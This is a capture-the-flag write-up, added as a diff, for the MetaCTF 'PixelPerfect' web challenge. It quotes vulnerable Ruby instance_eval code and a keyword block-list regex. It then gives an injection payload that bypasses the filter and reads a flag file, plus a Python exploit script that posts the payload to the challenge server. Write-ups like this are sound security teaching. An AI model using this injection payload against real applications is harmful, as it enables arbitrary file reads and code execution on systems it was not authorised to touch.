@@ -1,0 +1,128 @@
+---
+title: 'MetaCTF January 2026 - PixelPerfect'
+description: 'Writeup for PixelPerfect from MetaCTF January 2026. A Web challenge involving Ruby Code Injection via instance_eval.'
+date: 2026-02-01
+tags: ['writeup', 'web', 'ruby', 'code-injection', 'rce', 'filter-bypass', 'metactf']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Overview
+
+**Name:** PixelPerfect
+**Type:** Web
+**Description:** An image processing web application that allows users to upload images and apply transformations using metadata directives.
+
+## Vulnerability Analysis
+
+The vulnerability exists in the `image_processor.rb` (or `app.rb` class `ImageProcessor`) where user-supplied metadata is processed.
+
+### The Vulnerable Code
+
+At line 58 of `app.rb`:
+
+```ruby
+instance_eval("apply_#{directive}('#{value}')")
+```
+
+This uses `instance_eval` to dynamically execute methods based on the `directive` and `value` provided in the metadata. This is a classic **Ruby Code Injection** vulnerability.
+
+### The Filter
+
+The application attempts to filter malicious input at line 23:
+
+```ruby
+if text =~ /system|exec|`|\$|eval|load|require|IO|File|#\{/
+  raise "Potentially malicious metadata detected!"
+end
+```
+
+This regex blocks many dangerous keywords, including `File` and `eval`.
+
+## Exploitation
+
+### Step 1: Filter Bypass
+
+We need to read the flag from the filesystem. The obvious choice `File.read('/flag.txt')` is blocked because it contains `File`.
+
+However, the `ImageProcessor` class has a utility method:
+
+```ruby
+def read_file(path)
+  File.read(path)
+end
+```
+
+Since the filter `/File/` is case-sensitive (by default in Ruby), the string `read_file` (lowercase) successfully bypasses the filter! Alternatively, Ruby's `open()` method (from Kernel) is also available and not blocked.
+
+### Step 2: Code Injection
+
+We can inject code by breaking out of the string interpolation in `instance_eval`. 
+If we send metadata `format: jpg'); CODE; #`, the eval becomes:
+
+```ruby
+apply_format('jpg'); CODE; #')
+```
+
+### Step 3: The "Hash Iteration" Constraint
+
+A major hurdle was exfiltrating the flag. We initially tried to add the flag to the `@metadata` hash so it would be displayed on the success page:
+
+```ruby
+@metadata['flag'] = read_file('/flag.txt')
+```
+
+This failed because the injection happens *incorrectly inside* the `@metadata.each` loop mechanism (or similar context). Ruby throws a `RuntimeError`: **can't add a new key into hash during iteration**.
+
+### Step 4: The Solution
+
+Since we cannot *add* new keys, we must *modify* an existing key. The `format` key is already present in the hash being iterated.
+
+**Payload:**
+
+```ruby
+format: jpg');@metadata['format']=open('/app/flag.txt').read.chomp;#
+```
+
+**Execution Flow:**
+1. `apply_format('jpg')` runs successfully.
+2. `@metadata['format']` is updated with the content of `/app/flag.txt`.
+3. The rest is commented out with `#`.
+4. The application completes processing and renders `success.erb`.
+5. `success.erb` iterates over `@metadata` and displays the modified `format` value, revealing the flag.
+
+## Final Exploit Script
+
+```python
+import requests
+import re
+
+url = "http://eie7rrzs.chals.mctf.io/process"
+
+# Create dummy image
+with open("test.jpg", "wb") as f: f.write(b"test")
+
+# Exploit payload
+# 1. Close the apply_format call: jpg')
+# 2. Modify EXISTING key to bypass iteration constraint: @metadata['format']=...
+# 3. Read flag (using open/read/chomp): open('/app/flag.txt').read.chomp
+# 4. Comment out rest: ;#
+metadata = "format: jpg');@metadata['format']=open('/app/flag.txt').read.chomp;#"
+
+response = requests.post(url, 
+    files={'image': ('test.jpg', open('test.jpg', 'rb'), 'image/jpeg')},
+    data={'metadata': metadata},
+    allow_redirects=True
+)
+
+# Extract Flag
+matches = re.findall(r'(MetaCTF\{[^}]+\})', response.text)
+if matches:
+    print(f"FLAG: {matches[0]}")
+```
+
+## Flag
+
+```text
+MetaCTF{1nst4nc3_3v4l_m4k3s_y0ur_RMagick_g0_b00m}
+```
